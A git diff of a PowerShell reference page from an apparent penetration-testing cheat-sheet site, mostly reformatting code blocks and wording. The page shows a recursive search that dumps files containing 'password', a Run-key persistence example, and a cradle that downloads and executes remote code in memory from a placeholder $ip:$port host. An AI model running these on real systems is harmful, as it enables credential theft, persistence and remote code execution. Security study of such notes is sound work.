@@ -441,6 +441,12 @@ echo %USERNAME%
 {% endtab %}
 {% endtabs %}
 
+Convert cmd.exe environment variables to PowerShell:
+
+```
+%SYSTEMROOT% == $env:SystemRoot
+```
+
 You can assign values to Environment Variables without using a cmdlet using the following syntax:
 
 ```bash
@@ -453,11 +459,15 @@ Examples:
 * `$env:hostname`
 * `$env:path`
 
+{% hint style="info" %}
+If you set a value to a environment variable that does not exist, Windows will create it.  You can use this to create your own custom environment variables.
+{% endhint %}
+
 You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:
 
 ### Adding a Folder to PATH
 
-```bash
+```powershell
 Set-Item -Path Env:PATH -Value ($Env:Path + ";C:\Windows\Temp")
 ```
 
@@ -489,7 +499,7 @@ The **System.Environment** class provides **GetEnvironmentVariable** and **SetEn
 
 The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy
 
-```bash
+```powershell
 $path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
 $newpath = $path + ';C:\Program Files\Fabrikam\Modules'
 ```
@@ -498,7 +508,7 @@ $newpath = $path + ';C:\Program Files\Fabrikam\Modules'
 
 Find hidden files
 
-```
+```powershell
 Get-ChildItem -Force
 ```
 
@@ -506,7 +516,7 @@ Get-ChildItem -Force
 
 This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.
 
-```bash
+```powershell
 $file = (Get-ChildItem $file_name) #can shorten command with gci, dir, or ls
 $file.attributes #Show the files attributes
 # Normal
@@ -542,19 +552,19 @@ The above is expanded for visibility of the individual elements. The shorthand v
 
 #### Full version:
 
-```bash
+```powershell
 Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
 ```
 
 #### Explanation:
 
-```bash
+```powershell
 # Get a listing of all files within this folder and its subfolders.
 Get-ChildItem -Recurse |
 
 # Filter files according to a script.
 Where-Object {
-    # Pick only the files that contain the string 'dummy'.
+    # Pick only the files that contain the string 'password'.
     # Note: The -Quiet parameter tells Select-String to only return a Boolean. This is preferred if you just need to use Select-String as part of a filter, and don't need the output.
     (Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true
 } |
@@ -569,17 +579,21 @@ ForEach-Object {
 }
 ```
 
-Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names in the shorthand version, you may want to note the following significant differences between the "full" versions and the "golfed" version:
+Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names in the shorthand version, you may want to note the following significant differences between the "full" versions and the "condensed" version:
 
-`Select-String` was swapped to use piped input instead of `-InputObject`. The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional. The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line. `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true. (Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.) `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
-
-`ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}`
+* `Select-String` was swapped to use piped input instead of `-InputObject`.&#x20;
+* The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional.&#x20;
+* The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line.&#x20;
+* `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true.&#x20;
+  * Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.&#x20;
+* `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
+  * `ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}`
 
 ## Modifying the Registry
 
-To add, edit, and modify registry keys. Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path (popular persistence location!), but any path can be substituted.
+Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path (a popular persistence location!), but any path can be substituted.
 
-```bash
+```powershell
 # add a new key to registry:
 New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name
 
@@ -624,9 +638,9 @@ The default paths to the executables for PowerShell and PowerShell ISE on releva
 {% endtab %}
 
 {% tab title="Linux/MacOS" %}
-`PowerShell.exe full path: /usr/local/microsoft/powershell/7/`
+PowerShell full path: `/usr/local/microsoft/powershell/7/`
 
-`7 is the version number of PS Core, so this can change...`
+7 is the version number of PS Core, so this can change...
 {% endtab %}
 {% endtabs %}
 
@@ -638,15 +652,15 @@ PowerShell version of `wget:`
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('$ip:$port/$file','$outfile'))"
 ```
 
-Can also use this example below to save the file to the local machine.
+You can also use the example below to save the file to the local machine.
 
-```
+```powershell
 wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
 ```
 
 `wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile $out_file` is needed to save the file to disk.
 
-Retrieve file and execute remote code after downloading:
+Retrieve file and execute remote code after downloading (in-memory!):
 
 ```bash
 powershell -c "Invoke-Expression(New-Object System.Net.Webclient).downloadString('http://$ip:$port/$file')"
